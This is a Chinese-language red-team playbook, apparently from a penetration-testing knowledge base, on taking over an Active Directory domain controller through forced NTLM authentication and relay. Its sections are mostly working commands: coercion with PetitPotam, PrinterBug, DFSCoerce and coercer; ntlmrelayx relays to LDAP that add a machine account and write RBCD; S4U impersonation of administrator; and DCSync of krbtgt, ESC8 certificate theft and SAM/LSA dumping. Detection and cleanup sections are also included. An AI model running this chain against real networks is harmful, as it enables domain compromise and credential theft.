# 中继与强制认证链：前置条件、十几种触发器、relay 到 RBCD 的完整链

> 被 `competition-relay-coercion-chain` 引用。这条链的价值是**不破任何密码**；
> 代价是**前置条件多**，任意一个不成立整条链就废。所以本文把「前置条件」放在第一节，
> 而不是最后——90% 的失败都发生在这里。
>
> 五个环节必须逐段证明：`coercion 源 → 捕获的认证 → relay 目标 → 接受点 → 效果`。

## 一、前置条件（缺一个就别开始）

| 条件 | 为什么必须 | 怎么验 |
| --- | --- | --- |
| **目标服务未强制签名/加密** | 中继是把 NTLM 认证转发出去；签名会让转发失效 | SMB：`nxc smb <ip> --gen-relay-list`；LDAP：`nxc ldap <dc> -M ldap-checker`；HTTP：看是否要求 EPA |
| **能强制某台机器来认证** | 需要「源」主动发起 NTLM 到你的监听器 | 有打印机/RPC/EFS 等触发面（第三节） |
| **被强制的身份足够高** | 强制出来的是**机器账号**（`DC01$`）或高权用户 | 默认机器账号即可（`DC01$` 能改自己 ACL） |
| **监听器能被源访问** | 源要能连到你的 IP:445/80/139 | 同网段或路由可达；防火墙放行 |
| **NTLM 未被域策略禁用** | 禁了就没有 NTLM 可中继 | 见 `identity-windows.md` 第三节的 RestrictNTLM |

### 三种协议的签名判据

```bash
# SMB 签名（最常用的 relay 目标）
nxc smb 10.0.0.0/24 --gen-relay-list relay_targets.txt
# 输出非空 = 这些主机签名关闭，可中继

# LDAP 签名（打 DC 的关键）
nxc ldap 10.0.0.10 -u user -p pass -M ldap-checker
# 关注 "LDAP signing not required" / "Channel binding not enforced"

# LDAPS 的 EPA（Extended Protection for Authentication）
# 有 EPA 时中继到 LDAPS 会失败（EPA 绑定 TLS 通道）
```

### LDAP 中继的两种合法化

| 目标 | 条件 | 效果 |
| --- | --- | --- |
| `ldap://`（389） | LDAP 签名**未要求** | 可做 ACL 写入（RBCD/加组/改密码） |
| `ldaps://`（636） | **未强制 EPA** | 同上，但走加密通道；EPA 开启即失败 |

```bash
# 快速判断 LDAP 签名要求（无需账号，看 rootDSE 的 supportedControl 不够，
# 需要实际尝试一次简单绑定或读域控策略）
nxc ldap 10.0.0.10 -u '' -p '' 
```

## 二、relay 的三种落地形态（先想清楚要什么，再选目标）

| 目标协议 | 落地动作 | 需要什么 |
| --- | --- | --- |
| **SMB → SMB** | 直接命令执行（`-c`）或读共享 | 目标签名关 + 被中继身份是目标的管理员 |
| **SMB → LDAP(S)** | 写 ACL：RBCD、加组、改密码、设 `msDS-KeyCredentialLink` | 被中继身份对目标对象有写权（**机器账号对自己有写权**） |
| **HTTP → ADCS** | 申请证书（ESC8） | CA 装了 Web Enrollment 且未开 EPA |
| **SMB → HTTP（其他）** | 打内网 Web 应用的管理接口 | 应用接受 NTLM 且未做 EPA |

**最常见也最强的组合是「强制 DC 机器账号 → 中继到 LDAP → 写 RBCD → S4U 打 DC」。**

## 三、强制认证触发器清单（命令 + 前提）

### 3.1 打印机系列（最经典，历史最久）

```bash
# PrinterBug（MS-RPRN）：让目标的 Spooler 去连你的 SMB
python3 printerbug.py corp.local/user:pass@10.0.0.20 10.0.0.99

# 新版统一工具（推荐，参数更清楚）
coercer coerce -u user -p pass -d corp.local -t 10.0.0.20 \
  -l 10.0.0.99 --always-continue
```

前提：目标 `Spooler` 服务在跑（`sc query Spooler`）。**Server 2022 / Win11 起默认关闭 Spooler**，
这条在新环境基本失效。

### 3.2 PetitPotam（MS-EFSRPC）

```bash
# 未认证版本（打 DC 最常用；很多环境已打补丁）
python3 PetitPotam.py -u '' -p '' 10.0.0.99 10.0.0.10

# 认证版本（需要任意域账号）
python3 PetitPotam.py -u user -p pass 10.0.0.99 10.0.0.10
```

前提：目标 EFSRPC 接口可访问（`\pipe\efsrpc`），且**未打 2021 年 8 月后的加固补丁**
（以及未启用 `Restrict NTLM`）。

### 3.3 DFSCoerce（MS-DFSNM）

```bash
python3 dfscoerce.py -u user -p pass 10.0.0.99 10.0.0.10
```

前提：目标的 DFS Namespace 服务（`DFSNM`）可访问。对 **DC 也有效**，且补丁覆盖比 PetitPotam 差。

### 3.4 ShadowCoerce（MS-FSRVP）

```bash
python3 shadowcoerce.py -u user -p pass 10.0.0.99 10.0.0.10
```

前提：目标运行「文件服务器 VSS 代理服务」（`FRSVCP`）。

### 3.5 MSEven / MSMQ 系列

```bash
# 这两个由 coercer 统一封装，直接用 coercer 指定方法最稳
coercer coerce -u user -p pass -d corp.local -t 10.0.0.20 -l 10.0.0.99 \
  --filter-method-name MSEven
coercer coerce -u user -p pass -d corp.local -t 10.0.0.20 -l 10.0.0.99 \
  --filter-method-name MSMQ
```

前提：目标开了 EventLog 远程（`MSEven`）或装了 Message Queuing（`MSMQ`，默认不装）。
**不要用来源不明的单文件脚本**——coercer 已覆盖这些方法，参数还能统一。

### 3.6 其他通用触发器（coercer 已内置）

```bash
# 一次试全部（推荐：不确定目标开什么服务时）
coercer coerce -u user -p pass -d corp.local -t 10.0.0.20 \
  -l 10.0.0.99 --always-continue

# 只试某几类（减少噪声）
coercer coerce -u user -p pass -d corp.local -t 10.0.0.20 -l 10.0.0.99 \
  --filter-method-name PetitPotam,DFSCoerce,PrinterBug

# 列出所有可用方法（不发送）
coercer list
```

`coercer` 覆盖的方法（按 `coercer list` 输出为准）：

| 方法 | 协议 | 目标服务 |
| --- | --- | --- |
| `PetitPotam` | MS-EFSRPC | EFS |
| `DFSCoerce` | MS-DFSNM | DFS Namespace |
| `PrinterBug` | MS-RPRN | Spooler |
| `ShadowCoerce` | MS-FSRVP | VSS 代理 |
| `MSEven` | MS-EVEN | EventLog 远程 |
| `MSMQQ` | MS-MSMQ | MSMQ |
| `FileDropper` | MS-FSRM | 文件服务器资源管理器 |
| `WebDAV`（`WebClient`） | WebDAV | `\\host@80\` 触发（可绕 445 封锁） |

### 3.7 WebDAV 触发（445 被封时的重要替代）

```bash
# 如果目标封了 445，用 WebDAV 让它在 80 端口发起 NTLM
# 前提：目标启用了 WebClient 服务
coercer coerce -u user -p pass -d corp.local -t 10.0.0.20 -l 10.0.0.99 \
  --filter-method-name WebDAV
```

**判据**：目标机 `WebClient` 服务（`sc query WebClient`）必须是 `RUNNING`。
Server 默认关闭，工作站默认手动。

## 四、完整链：coerce → relay 到 LDAP → RBCD → S4U → DCSync

这是「不破密码拿 DC」的标准路径，六个步骤都要留证据。

```bash
# ── 步骤 0：确认前置条件 ──────────────────────────────
nxc smb 10.0.0.20 --gen-relay-list relay_targets.txt          # 目标 SMB 签名关
nxc ldap 10.0.0.10 -u user -p pass -M ldap-checker            # LDAP 签名未强制

# ── 步骤 1：起中继（先起，再触发）────────────────────
# 注意：-t 指向 DC 的 LDAP；--add-computer 让中继"顺手"建一个机器账号
impacket-ntlmrelayx -t ldaps://10.0.0.10 \
  -smb2support --add-computer 'EVIL$' 'P@ss123!' \
  --delegate-access -debug

#   --add-computer  : 用中继来的机器账号权限建一个新机器账号
#   --delegate-access: 自动把新机器账号写进目标机器对象的 RBCD 属性

# ── 步骤 2：触发（让 DC01$ 来认证）────────────────────
coercer coerce -u user -p pass -d corp.local -t 10.0.0.10 \
  -l 10.0.0.99 --always-continue

# ── 步骤 3：确认中继成功（关键判据，见第五节）──────────
#   ntlmrelayx 输出必须同时出现：
#   [*] Authenticating connection from CORP/DC01$@10.0.0.10
#   [*] LDAP session ... created computer EVIL$ with password ...
#   [*] Delegation rights modified successfully!

# ── 步骤 4：用 EVIL$ 走 S4U 拿 DC 的票 ───────────────
impacket-getST -spn 'cifs/dc01.corp.local' -impersonate administrator \
  -dc-ip 10.0.0.10 'CORP.LOCAL/EVIL$:P@ss123!'
export KRB5CCNAME=administrator@cifs_dc01.corp.local@CORP.LOCAL.ccache

# ── 步骤 5：验证被接受（票真的能用）──────────────────
impacket-smbclient -k -no-pass //dc01.corp.local/c$ -c 'ls'

# ── 步骤 6：收尾（DCSync，须授权）＋清理 ─────────────
impacket-secretsdump -k -no-pass -just-dc-user krbtgt dc01.corp.local
# 清理（必须做）
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'DC01$' -action clear \
  -dc-ip 10.0.0.10 corp.local/user:pass
```

### 变体 1：直接提升已有用户（`--escalate-user`）

```bash
impacket-ntlmrelayx -t ldaps://10.0.0.10 -smb2support \
  --escalate-user 'user' --no-dump
```

`--escalate-user` 会尝试把目标用户加进 `Domain Admins`（需要中继身份对域对象有写权）。
**对 DC 机器账号无效**（DC 不能改自己的组成员），所以这条主要用在「中继一个域管身份」的场景。

### 变体 2：ESC8 证书路径

```bash
# 中继到 CA 的 Web Enrollment
impacket-ntlmrelayx -t http://10.0.0.15/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# 触发 DC 来认证
python3 PetitPotam.py -u user -p pass 10.0.0.99 10.0.0.10

# 拿到 base64 证书 → 保存 → 换哈希
# ntlmrelayx 输出："[*] GOT CERTIFICATE! ID 12" 与 base64 blob
base64 -d cert.b64 > dc01.pfx
certipy-ad auth -pfx dc01.pfx -dc-ip 10.0.0.10
```

### 变体 3：不改 ACL，直接读（`--dump`）

```bash
# 中继到 SMB 后直接 dump 目标的 SAM/LSA（需要被中继身份是目标管理员）
impacket-ntlmrelayx -t smb://10.0.0.20 -smb2support --dump
```

## 五、验伤：怎么证明中继真的成功了

**`ntlmrelayx` 的输出要逐行读**，三个阶段分开：

| 输出 | 含义 | 是否算成功 |
| --- | --- | --- |
| `[*] Received connection at ... from CORP/DC01$` | **只收到连接**（NTLM 协商开始） | ❌ 不算 |
| `[*] Authenticating connection from CORP/DC01$` | **拿到 NTLM 认证并开始转发** | 中间态 |
| `[*] LDAP session ... established` | 转发成功，目标接受了 | ✅ 接近 |
| `[*] Created computer EVIL$` / `Delegation rights modified` | **落地动作完成** | ✅ 算 |

**最终验伤（必须多走一步）**：

```bash
# 1) 机器账号真的建出来了？（用新账号自己做一次 LDAP 简单绑定，能绑上即存在且密码对）
nxc ldap 10.0.0.10 -u 'EVIL$' -p 'P@ss123!' 
# 输出 [+] CORP.LOCAL\EVIL$:P@ss123! 才算建成功

# 2) RBCD 属性真的写进去了？
impacket-rbcd -delegate-to 'DC01$' -action read -dc-ip 10.0.0.10 corp.local/user:pass
# 输出应含 EVIL$ 的 SID（S-1-5-21-...-<新机器账号RID>）

# 3) 票真的能用？
impacket-smbclient -k -no-pass //dc01.corp.local/c$ -c 'ls'

# 4) DC 侧有 4624
# 目标 4624 Type 3 + Authentication Package=NTLM（中继那一跳）
# 以及随后 Kerberos 的 4624（用票那一跳）
```

**注意第 1 步不能省**：`--add-computer` 在 `MachineAccountQuota=0` 时可能**假成功**
（输出 `Created computer` 但对象没落地或被策略回滚），只有「用这个账号能绑上」才算真建出来。

### 反例（看起来成功其实是假）

| 现象 | 真相 |
| --- | --- |
| `Received connection` 但无 `Authenticating` | 捕获到了协商但**目标拒绝**（签名要求 / EPA / 版本） |
| `Authenticating` 但 `LDAP session` 报 `invalidCredentials` | 被中继身份的认证在 LDAP 上失败（多半是 LDAP 签名要求） |
| `Created computer` 成功但 `getST` 失败 | `--delegate-access` 没生效（RBCD 写到了错误的对象），或 `MachineAccountQuota=0` 导致建的账号无效 |
| `getST` 成功但 `smbclient` 失败 | 票的 SPN 与目标不匹配；或目标要求 SMB 签名（**票不能绕签名**） |
| 一切成功但 DCSync 失败 | 被中继身份不够（机器账号无复制权），需要再打一步提权 |

## 六、为什么「中继到 LDAP 写 RBCD」能成——原理一句话

**机器账号对自己在 AD 里的计算机对象有 `WriteProperty`（`msDS-AllowedToActOnBehalfOfOtherIdentity`）**。
所以只要你能以 `DC01$` 的身份向 LDAP 发一次写请求，就能把「允许谁代表我」改成你控制的账号。
这就是为什么**不需要任何管理员权限**，只需要一次成功的 NTLM 中继。

对照：机器账号能改的还有 `msDS-KeyCredentialLink`（写进去 → 用 KeyTrust 登录，即 Shadow Credentials），
是 RBCD 的等价替代，且**不需要 S4U**：

```bash
# Shadow Credentials（中继到 LDAP 时也能做；需要对该计算机对象有写权限）
certipy-ad shadow auto -u 'user@corp.local' -p pass -account 'DC01$' -dc-ip 10.0.0.10
# 成功后会用生成的 KeyTrust 证书走 PKINIT，并直接返回该账号的 NT 哈希
```

## 七、检测视角

| 动作 | 日志 | 信号 |
| --- | --- | --- |
| 强制认证（PrinterBug） | 目标主机 **5156**（出站连接）+ Spooler 日志 | `spoolsv.exe` 向陌生 IP 发 445 |
| 强制认证（PetitPotam） | 目标 **5156** + EFSRPC 调用 | `lsass.exe` / `svchost` 向陌生 IP 发 445 |
| NTLM 中继 | 目标（relay 终点）**4624 Type 3** | `Authentication Package=NTLM`，`Workstation Name` 与实际源不符 |
| 中继到 LDAP 的写 | DC **5136** | `msDS-AllowedToActOnBehalfOfOtherIdentity` 或 `msDS-KeyCredentialLink` 被改 |
| 中继建机器账号 | DC **4741** | `TargetUserName` 以 `$` 结尾，`Subject` 是**机器账号**（不是人） |
| LDAP 简单绑定 | DC **4624 Type 3** + LDAP 日志 | 大量 `ldap://` 上的 NTLM 绑定，源 IP 是内网陌生主机 |
| ESC8 中继 | IIS 日志 + CA 日志 | `/certsrv/certfnsh.asp` 收到非浏览器的 NTLM（UA 为空/异常） |
| RBCD 落地后的 S4U | DC **4769** | `Transited Services` 非空，请求方是新建的 `EVIL$` |
| 中继工具落地 | 主机 4688 / Sysmon 1 | `ntlmrelayx.py`、`coercer`、`PetitPotam.py` 命令行 |

**最有效的两条蓝队规则**：

1. **4741 且 `Subject` 是机器账号** —— 正常域里机器账号不会建机器账号。这条几乎零误报。
2. **5136 且属性是 `msDS-AllowedToActOnBehalfOfOtherIdentity`** —— 变更极少，任何一条都值得人工看。

**响度**：强制认证本身**很高**（5156 明晃晃外连，尤其 `spoolsv.exe`/`lsass.exe` 打 445）；
中继的写入动作**低**（只有 5136/4741）。所以「怎么发现」通常靠前半段，不是后半段。

## 八、常见坑

1. **先触发后起监听**。NTLM 认证是一次性的，监听器不在就丢了。**一律先起 relay，再 coerce**。
2. **中继到 `ldap://` 但环境要求签名**。报 `invalidCredentials` 或直接断连。改 `ldaps://` 试，
   但要确认**未强制 EPA**——EPA 开了 `ldaps://` 也不行。
3. **想中继到同一台机器**。NTLM 有「回环保护」（`NTLM reflection` 自 Win2008 起被禁），
   **不能把 A 的认证中继回 A**。所以必须有第二台（DC 或另一成员机）。
4. **`--add-computer` 失败因 `MachineAccountQuota=0`**。默认 10，很多加固环境改成 0。
   验：
   ```bash
   nxc ldap 10.0.0.10 -u user -p pass -M get-desc-users   # 或直接读域对象属性
   ldapsearch -x -H ldap://10.0.0.10 -D 'user@corp.local' -w pass \
     -b 'DC=corp,DC=local' -s base '(objectClass=*)' ms-DS-MachineAccountQuota
   ```
   配额为 0 时改用 `--escalate-user` 或 Shadow Credentials；也可用已控的其他机器账号做 RBCD 源。
5. **DC 的 Spooler 关了还在试 PrinterBug**。Server 2022 默认关。先 `sc query Spooler` 确认，
   或换 `DFSCoerce`（覆盖更好）。
6. **445 被封就放弃**。用 WebDAV 触发（`\\host@80\`），中继目标走 HTTP 而不是 SMB。
7. **中继成功但票不能用**。最常见的两个原因：RBCD 写到了**错误的计算机对象**（写成 `DC01` 而不是 `DC01$`），
   或 `getST` 用了 IP 而不是 FQDN（SPN 不匹配）。
8. **不清理 RBCD**。这条是留后门；演练结束必须 `-action clear`，并删掉建的机器账号：
   `impacket-addcomputer -computer-name 'EVIL$' -delete -dc-ip 10.0.0.10 corp.local/user:pass`。
9. **忽略 NTLM 已被全域禁用**。`RestrictNTLM: Outgoing` 一开，整条链的前提就没了；
   此时只能走 Kerberos 侧的手法（委派、ADCS）。
10. **忘了 `-smb2support`**。不加有时无法处理 SMB2/3 协商，表现为「收到连接但认证失败」。